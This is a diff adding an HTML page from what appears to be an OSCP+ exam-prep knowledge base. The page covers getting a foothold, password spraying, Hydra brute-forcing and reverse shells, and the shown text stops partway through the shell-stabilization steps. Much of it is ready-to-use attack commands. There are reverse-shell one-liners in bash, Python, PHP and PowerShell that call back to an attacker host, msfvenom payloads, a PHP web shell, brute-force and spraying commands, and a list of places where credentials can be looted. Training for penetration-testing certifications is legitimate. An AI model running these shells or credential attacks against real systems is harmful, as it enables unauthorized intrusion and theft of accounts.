@@ -1,0 +1,495 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Access · Shells · Creds · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">💥 Access · Shells · Creds</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v5-[foothold-checklist]-getting-your-first-shell-a-foothold">[FOOTHOLD-CHECKLIST]  getting your first shell (a &quot;foothold&quot;)</a><a class="navlink lvl2" href="#v5-[quick]-order-of-attempts-cheapest-and-easiest-first">[QUICK]  order of attempts — cheapest and easiest first</a><a class="navlink lvl2" href="#v5-[practical]-pick-your-way-in-based-on-what-you-have">[PRACTICAL]  pick your way in based on what you have</a><a class="navlink lvl2" href="#v5-[foothold-creds-sources]-where-credentials-hide-check-all-of-these">[FOOTHOLD-CREDS-SOURCES]  where credentials hide (check all of these)</a><a class="navlink lvl2" href="#v5-[password-spray]-guessing-passwords-safely-careful-lockouts">[PASSWORD-SPRAY]  guessing passwords safely (careful — lockouts!)</a><a class="navlink lvl2" href="#v5-[hydra]-brute-forcing-a-login-last-resort-watch-for-lockouts">[HYDRA]  brute-forcing a login (last resort — watch for lockouts)</a><a class="navlink lvl2" href="#v5-[file-analysis]-you-found-a-fileimage-and-dont-know-what-to-do-with-it">[FILE-ANALYSIS]  you found a file/image and don&#x27;t know what to do with it</a><a class="navlink lvl1" href="#v5-[shell-quick]-getting-a-reverse-shell">[SHELL-QUICK]  GETTING A REVERSE SHELL</a><a class="navlink lvl2" href="#v5-[shell-quick]-the-essentials-one-screen">[SHELL-QUICK]  the essentials  (one screen)</a><a class="navlink lvl2" href="#v5-[shell-linux]-reverse-shells-when-the-target-is-linux">[SHELL-LINUX]  reverse shells when the target is Linux</a><a class="navlink lvl2" href="#v5-[shell-windows]-reverse-shells-when-the-target-is-windows">[SHELL-WINDOWS]  reverse shells when the target is Windows</a><a class="navlink lvl2" href="#v5-[shell-stabilize]-upgrading-a-dumb-shell-to-a-proper-one-linux-[must-memorize]">[SHELL-STABILIZE]  upgrading a dumb shell to a proper one (Linux)  [MUST-MEMORIZE]</a><a class="navlink lvl2" href="#v5-[reverse-shell-not-connecting]-its-not-connecting-work-through-this-in-order">[REVERSE-SHELL-NOT-CONNECTING]  it&#x27;s not connecting — work through this in order</a><a class="navlink lvl1" href="#v5-[filetransfer-quick]-moving-files-between-kali-and-the-target">[FILETRANSFER-QUICK]  MOVING FILES BETWEEN KALI AND THE TARGET</a><a class="navlink lvl2" href="#v5-[quick]-serve-from-kali">[QUICK]  serve from Kali</a><a class="navlink lvl2" href="#v5-[filetransfer-troubleshooting]">[FILETRANSFER-TROUBLESHOOTING]</a><a class="navlink lvl1" href="#v5-[password-attacks]-everything-about-passwords-in-one-place">[PASSWORD-ATTACKS]  🔑 everything about passwords, in one place</a><a class="navlink lvl1" href="#v5-[credentials-quick]-using-credentials">[CREDENTIALS-QUICK]  USING CREDENTIALS</a><a class="navlink lvl2" href="#v5-[quick]-the-golden-rule-every-credential-try-it-everywhere">[QUICK]  the golden rule: every credential → try it EVERYWHERE</a><a class="navlink lvl2" href="#v5-[credentials-sources]-where-to-loot-creds-after-you-get-a-shell">[CREDENTIALS-SOURCES]  where to loot creds after you get a shell</a><a class="navlink lvl2" href="#v5-[hash-identification]-i-found-a-hash-what-is-it">[HASH-IDENTIFICATION]  &quot;I found a hash — what is it?&quot;</a><a class="navlink lvl2" href="#v5-[wordlist-mutate]-building-a-custom-wordlist-when-rockyou-fails">[WORDLIST-MUTATE]  building a custom wordlist (when rockyou fails)</a><a class="navlink lvl2" href="#v5-[credentials-tools]">[CREDENTIALS-TOOLS]</a><a class="navlink lvl1" href="#v5-[exploit-research]-finding-and-using-public-exploits">[EXPLOIT-RESEARCH]  finding and using public exploits</a><a class="navlink lvl2" href="#v5-[quick]-the-pipeline">[QUICK]  the pipeline</a><a class="navlink lvl2" href="#v5-[searchsploit]-the-offline-exploit-db-search-tool">[SEARCHSPLOIT]  the offline Exploit-DB search tool</a><a class="navlink lvl2" href="#v5-[exploit-research-cautions]">[EXPLOIT-RESEARCH-CAUTIONS]</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v5-oscp-knowledge-base-volume-3">OSCP+ KNOWLEDGE BASE — VOLUME 3</div>
+<h2 id="v5-getting-a-shell-moving-files-cracking-passwords-finding-exploits">GETTING A SHELL · MOVING FILES · CRACKING PASSWORDS · FINDING EXPLOITS<a class="anchor" href="#v5-getting-a-shell-moving-files-cracking-passwords-finding-exploits">#</a></h2>
+<blockquote><strong>Read this box first.</strong> By now you&#x27;ve found a bug or some creds. This volume turns that into a real, working command shell on the target, shows how to move files back and forth, and how to crack any passwords/hashes you loot.  <strong>Two machines, two IPs — keep them straight:</strong> - <strong>Your Kali</strong> — the attacker. Its exam IP is on the VPN interface <code>tun0</code>. Find it: <code>ip addr show tun0</code>. In commands this is <code>&lt;yourKaliIP&gt;</code>, <code>&lt;IP&gt;</code>, <code>LHOST</code>, or <code>&lt;yourVPN-IP&gt;</code>. <strong>This is almost always the one beginners get wrong.</strong> - <strong>The target</strong> — the victim. That&#x27;s <code>$IP</code> (set it: <code>export IP=10.10.10.5</code>).  <strong>Key words defined once:</strong> - <strong>Shell</strong> = a command prompt on the target that YOU control. - <strong>Reverse shell</strong> = the target connects OUT to you (you run a &quot;listener&quot;; the target&#x27;s shell dials home). This is the usual approach because outbound connections get through firewalls more easily. - <strong>Listener</strong> = a program on your Kali (<code>nc -lvnp 443</code>) waiting to catch that incoming connection. - <strong>LHOST / LPORT</strong> = the Listener&#x27;s HOST (your Kali IP) and PORT (e.g. 443). &quot;L&quot; = *your* side.</blockquote>
+<hr>
+<h1 id="v5-[foothold-checklist]-getting-your-first-shell-a-foothold">[FOOTHOLD-CHECKLIST]  getting your first shell (a &quot;foothold&quot;)<a class="anchor" href="#v5-[foothold-checklist]-getting-your-first-shell-a-foothold">#</a></h1>
+<h2 id="v5-[quick]-order-of-attempts-cheapest-and-easiest-first">[QUICK]  order of attempts — cheapest and easiest first<a class="anchor" href="#v5-[quick]-order-of-attempts-cheapest-and-easiest-first">#</a></h2>
+<pre><code>1. Default creds     (product docs, admin:admin, or creds you already found)
+2. Weak creds        (Company1!, Welcome1, Summer2025!, the product name, username==password)
+3. Credential reuse  (EVERY cred you found → try on EVERY service and EVERY user)
+4. Anonymous access  (FTP/SMB/NFS/LDAP/Redis/Mongo that need no login)
+5. Known-version RCE (searchsploit / CVE — must match the version exactly)
+6. Web vulnerability (upload &gt; command injection &gt; SQLi-to-RCE &gt; LFI-to-RCE &gt; SSTI)
+7. Service misconfig (MSSQL xp_cmdshell, Redis file write, Postgres COPY, MySQL FILE)
+8. Password spray/brute (only with a real user list + a reason; last resort — can lock accounts)</code></pre>
+<h2 id="v5-[practical]-pick-your-way-in-based-on-what-you-have">[PRACTICAL]  pick your way in based on what you have<a class="anchor" href="#v5-[practical]-pick-your-way-in-based-on-what-you-have">#</a></h2>
+<ul>
+<li><strong>A version number</strong> → <code class="tag">[EXPLOIT-RESEARCH]</code>. Match version + architecture + auth exactly.</li>
+<li><strong>A login page</strong> → default/weak creds → SQLi auth bypass → reuse creds you found.</li>
+<li><strong>An upload form</strong> → <code class="tag">[WEB-UPLOAD]</code>.</li>
+<li><strong>A URL/file parameter</strong> → <code class="tag">[WEB-LFI]</code> / <code class="tag">[WEB-RFI]</code> / <code class="tag">[WEB-SSRF]</code>.</li>
+<li><strong>A feature that runs a system tool</strong> → <code class="tag">[WEB-CMDINJ]</code>.</li>
+<li><strong>Database access</strong> → the RCE path for that DB (<code class="tag">[SQLI-MSSQL]</code> xp_cmdshell, <code class="tag">[SQLI-POSTGRES]</code> COPY, <code class="tag">[ENUM-MYSQL]</code> FILE, <code class="tag">[ENUM-REDIS]</code> write).</li>
+<li><strong>SMB/WinRM creds</strong> → <code>impacket-psexec</code> / <code>evil-winrm</code> = instant shell.</li>
+<li><strong>SSH creds/key</strong> → <code>ssh</code>.</li>
+</ul>
+<h2 id="v5-[foothold-creds-sources]-where-credentials-hide-check-all-of-these">[FOOTHOLD-CREDS-SOURCES]  where credentials hide (check all of these)<a class="anchor" href="#v5-[foothold-creds-sources]-where-credentials-hide-check-all-of-these">#</a></h2>
+<p>Config files, <code>.env</code>, <code>wp-config.php</code> / <code>web.config</code>, database dumps, <code>.git</code> history, SNMP process arguments, LDAP <code>description</code> fields, SMB shares (GPP <code>Groups.xml</code>, <code>unattend.xml</code>, scripts), backups (<code>.bak</code>, <code>.zip</code>), source-code comments and JS files, <code>~/.bash_history</code>, <code>~/.ssh/</code>, KeePass <code>.kdbx</code> files, browser password stores, and memory (LSASS on Windows), sticky notes / <code>notes.txt</code>.</p>
+<h2 id="v5-[password-spray]-guessing-passwords-safely-careful-lockouts">[PASSWORD-SPRAY]  guessing passwords safely (careful — lockouts!)<a class="anchor" href="#v5-[password-spray]-guessing-passwords-safely-careful-lockouts">#</a></h2>
+<p><strong>The rule:</strong> spray <strong>one</strong> password across <strong>many</strong> users — NOT many passwords against one user (that locks the account and tips off the defender).</p>
+<pre><code>nxc smb $IP -u users.txt -p &#x27;Season2025!&#x27; --continue-on-success
+#   check the lockout policy FIRST so you don&#x27;t lock accounts:
+nxc smb $IP -u $U -p $P --pass-pol</code></pre>
+<ul>
+<li>Common exam-style passwords: <code>Password1</code>, <code>Welcome1</code>, <code>&lt;Company&gt;1!</code>, <code>&lt;Season&gt;&lt;Year&gt;!</code>, username==password, the product&#x27;s default.</li>
+<li>**⭐ Spray one cred across MANY protocols + hosts in one shot — <code>nxcspray</code><strong> (a small bash wrapper around nxc; </strong>exam-legal** because it just *runs* nxc for you, no auto-exploitation):</li>
+</ul>
+<p>  <code></code>`bash</p>
+<p>  # install once: git clone https://github.com/NTHSec/nxcspray ; chmod +x nxcspray/nxcspray</p>
+<p>  nxcspray smb,winrm targets.txt -u e.hills -p &#x27;Il0vemyj0b2025!&#x27;   # these protocols vs a list of hosts</p>
+<p>  nxcspray all 10.1.45.200 -u e.hills -p &#x27;Password1&#x27;               # ALL protocols (smb/winrm/rdp/mssql/ssh…) vs one host</p>
+<p>  <code></code>`</p>
+<p>  Ideal right after a pivot: one command tells you every host where the cred is valid and where you&#x27;re <code>(Pwn3d!)</code>. (Same idea as looping <code>nxc &lt;proto&gt;</code> yourself — just faster.)</p>
+<ul>
+<li><strong>Brute-forcing one service</strong> (only with evidence): <code>hydra -L users.txt -P rockyou.txt &lt;service&gt;://$IP</code> — noisy, slow, last resort.</li>
+</ul>
+<h2 id="v5-[hydra]-brute-forcing-a-login-last-resort-watch-for-lockouts">[HYDRA]  brute-forcing a login (last resort — watch for lockouts)<a class="anchor" href="#v5-[hydra]-brute-forcing-a-login-last-resort-watch-for-lockouts">#</a></h2>
+<p><strong>What Hydra does:</strong> rapidly tries username/password combinations against a login. <code>-l</code> (lowercase L) = one username; <code>-L</code> = a file of usernames. <code>-p</code> = one password; <code>-P</code> = a file of passwords. The <code>service://</code> part picks what to attack.</p>
+<pre><code>hydra -l admin      -P rockyou.txt ftp://$IP
+hydra -L users.txt  -P rockyou.txt ssh://$IP -t 4        # -t 4 = only 4 parallel tries (SSH is fussy)
+hydra -l george     -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://$IP   # -s PORT = login is on a NON-standard port
+#   (same thing: hydra ... ssh://$IP:2222)
+hydra -l admin      -P rockyou.txt rdp://$IP
+hydra -C combos.txt &lt;service&gt;://$IP                       # combos.txt = one &quot;user:pass&quot; pair per line
+
+# ⭐ The tricky, most-needed one — an HTML login FORM (POST):
+#   format is  &quot;&lt;path&gt;:&lt;post-body with ^USER^ and ^PASS^&gt;:&lt;a string that only appears on FAILURE&gt;&quot;
+hydra -l admin -P rockyou.txt $IP http-post-form &quot;/login.php:user=^USER^&amp;pass=^PASS^:Invalid credentials&quot;
+hydra -L users.txt -P rockyou.txt $IP http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot;
+#   use  S=&lt;text&gt;  instead of  F=&lt;text&gt;  to match a SUCCESS marker (like a redirect header) instead
+# HTTP Basic auth (the grey browser popup):
+hydra -l admin -P rockyou.txt -f $IP http-get /admin       # -f = stop at the first valid pair</code></pre>
+<p><strong>Building the http-post-form string (the confusing part):</strong> submit the login once in Burp Suite, then copy: (1) the <strong>exact path</strong> (<code>/login.php</code>), (2) the <strong>POST body</strong> with the real username/password swapped for <code>^USER^</code>/<code>^PASS^</code>, and (3) a <strong>string that appears only when login FAILS</strong> (put it after <code>F=</code>). Common <code>-s</code> gotcha: <code>-s</code> is the <strong>port</strong>, <code>-p</code> is a single password — don&#x27;t mix them up. For web logins, <strong>ffuf is often easier</strong> — see <code class="tag">[WEB-AUTH]</code>.</p>
+<h2 id="v5-[file-analysis]-you-found-a-fileimage-and-dont-know-what-to-do-with-it">[FILE-ANALYSIS]  you found a file/image and don&#x27;t know what to do with it<a class="anchor" href="#v5-[file-analysis]-you-found-a-fileimage-and-dont-know-what-to-do-with-it">#</a></h2>
+<blockquote>⚠️ <strong>Rare on OSCP, common on beginner CTFs.</strong> Don&#x27;t sink time into images unless the box clearly points you at one (<code class="tag">[COMMON-RABBIT-HOLES]</code>).</blockquote>
+<pre><code>file suspicious.bin            # what type of file is it, really?
+strings -n 8 suspicious.bin    # print readable text inside it (creds/flags/paths often hide here)
+exiftool image.jpg             # metadata (author/comment/GPS) — sometimes leaks usernames or hints
+binwalk -e firmware.bin        # find and extract files hidden/appended inside another file
+steghide extract -sf image.jpg # pull data hidden inside an image (try empty passphrase, or a found password)
+zsteg image.png                # stego check for PNGs
+stegseek image.jpg wordlist    # brute-force a steghide passphrase with a wordlist</code></pre>
+<p><strong>⭐ exiftool as an actual way IN (more OSCP-relevant):</strong> if a website runs <strong>exiftool &lt; 12.24</strong> on images you upload → <strong>CVE-2021-22204</strong> = command execution. You upload a booby-trapped image (DjVu format) with your command inside it and the server runs it. Grab a public proof-of-concept <code>[LOOK-UP: CVE-2021-22204]</code> and pair it with <code class="tag">[WEB-UPLOAD]</code>. Check the exiftool version if the site shows you image metadata.</p>
+<hr>
+<h1 id="v5-[shell-quick]-getting-a-reverse-shell">[SHELL-QUICK]  GETTING A REVERSE SHELL<a class="anchor" href="#v5-[shell-quick]-getting-a-reverse-shell">#</a></h1>
+<h2 id="v5-[shell-quick]-the-essentials-one-screen">[SHELL-QUICK]  the essentials  (one screen)<a class="anchor" href="#v5-[shell-quick]-the-essentials-one-screen">#</a></h2>
+<pre><code># STEP 1 — on YOUR Kali, start the listener (waits for the target to connect back):
+nc -lvnp 443                                     # [MUST-MEMORIZE]  -l listen  -v verbose  -n no-DNS  -p port
+
+# STEP 2 — make the target run ONE of these (put YOUR Kali IP where it says &lt;IP&gt;):
+# Linux target, bash:
+bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/443 0&gt;&amp;1                # [MUST-MEMORIZE] the classic Linux reverse shell
+bash -c &#x27;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/443 0&gt;&amp;1&#x27;      # same, wrapped so it survives odd contexts
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; 443 &gt;/tmp/f    # if bash&#x27;s /dev/tcp is missing
+python3 -c &#x27;import socket,subprocess,os;s=socket.socket();s.connect((&quot;&lt;IP&gt;&quot;,443));[os.dup2(s.fileno(),f) for f in(0,1,2)];import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+# Windows target:
+nc.exe &lt;IP&gt; 443 -e cmd.exe                       # if you transferred nc.exe first
+powershell -e &lt;base64&gt;                           # PowerShell one-liner (build the base64 below)</code></pre>
+<blockquote>**Why <code>/dev/tcp/&lt;IP&gt;/443</code>?** Bash has a built-in trick: writing to the fake file <code>/dev/tcp/IP/PORT</code> opens a network connection. So this line connects the target&#x27;s shell back to your listener. <code>&gt;&amp;</code> and <code>0&gt;&amp;1</code> wire the shell&#x27;s input/output through that connection.</blockquote>
+<p><strong>Always listen on a common outbound port — 443, 80, or 8080.</strong> Firewalls usually allow those outbound, so your shell gets home.</p>
+<h2 id="v5-[shell-linux]-reverse-shells-when-the-target-is-linux">[SHELL-LINUX]  reverse shells when the target is Linux<a class="anchor" href="#v5-[shell-linux]-reverse-shells-when-the-target-is-linux">#</a></h2>
+<ul>
+<li>Try bash <code>/dev/tcp</code> or python first. If <code>bash</code> isn&#x27;t there, try <code>sh</code>, <code>nc</code>, <code>mkfifo</code>, <code>perl</code>, or <code>php -r</code>.</li>
+<li>PHP: <code>php -r &#x27;$s=fsockopen(&quot;&lt;IP&gt;&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</code></li>
+<li>Web PHP shell already on the box: <code>&lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;</code> then visit <code>?c=&lt;url-encoded reverse shell&gt;</code>.</li>
+<li><strong>Encoding tip:</strong> when sending a shell through a web parameter, URL-encode the special characters (<code>&amp;</code>, <code>;</code>, <code>|</code>, space). Through a command, base64 it: <code>echo -n &#x27;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/443 0&gt;&amp;1&#x27; | base64</code> on Kali → on target <code>echo &lt;base64&gt;|base64 -d|bash</code>.</li>
+</ul>
+<h2 id="v5-[shell-windows]-reverse-shells-when-the-target-is-windows">[SHELL-WINDOWS]  reverse shells when the target is Windows<a class="anchor" href="#v5-[shell-windows]-reverse-shells-when-the-target-is-windows">#</a></h2>
+<ul>
+<li><strong>PowerShell one-liner (base64-encoded)</strong> — build it on Kali:</li>
+</ul>
+<p>  <code></code>`bash</p>
+<p>  PS=&#x27;$c=New-Object System.Net.Sockets.TCPClient(&quot;&lt;IP&gt;&quot;,443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2&gt;&amp;1|Out-String);$s2=$r+&quot;PS &quot;+(pwd).Path+&quot;&gt; &quot;;$sb=[Text.Encoding]::ASCII.GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}&#x27;</p>
+<p>  echo -n &quot;$PS&quot; | iconv -t UTF-16LE | base64 -w0        # paste the result after:  powershell -e</p>
+<p>  <code></code>`</p>
+<ul>
+<li><strong>nc.exe:</strong> <code>nc.exe &lt;IP&gt; 443 -e cmd.exe</code> (you must transfer <code>nc.exe</code> to the target first).</li>
+<li><strong>Better interactive shells:</strong> ConPtyShell, RunasCs, or Nishang&#x27;s Invoke-PowerShellTcp <code class="tag">[LOOK-UP]</code>.</li>
+<li><strong>msfvenom</strong> (makes a ready-to-run exe — use on your ONE allowed Metasploit box, or just for a stable shell):</li>
+</ul>
+<p>  <code></code>`bash</p>
+<p>  msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f exe -o rev.exe</p>
+<p>  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=443 -f exe -o met.exe   # Meterpreter = MSF box only</p>
+<p>  <code></code>`</p>
+<ul>
+<li><strong>Web shells:</strong> an ASPX/JSP webshell, or <code>msfvenom -p ... -f aspx</code>.</li>
+</ul>
+<h2 id="v5-[shell-stabilize]-upgrading-a-dumb-shell-to-a-proper-one-linux-[must-memorize]">[SHELL-STABILIZE]  upgrading a dumb shell to a proper one (Linux)  [MUST-MEMORIZE]<a class="anchor" href="#v5-[shell-stabilize]-upgrading-a-dumb-shell-to-a-proper-one-linux-[must-memorize]">#</a></h2>
+<p>A fresh reverse shell is &quot;dumb&quot; — no arrow keys, no tab-complete, and Ctrl+C kills it. Fix it:</p>
+<pre><code>python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;   # step 1: get a proper bash (try &#x27;python&#x27; if python3 missing)
+# now press: Ctrl-Z   (this backgrounds the shell, dropping you to YOUR Kali)
+stty raw -echo; fg                                # step 2: fix the terminal + bring the shell back
+# press Enter twice
+export TERM=xterm ; export SHELL=/bin/bash        # step 3: set terminal type so clear/less/vim work
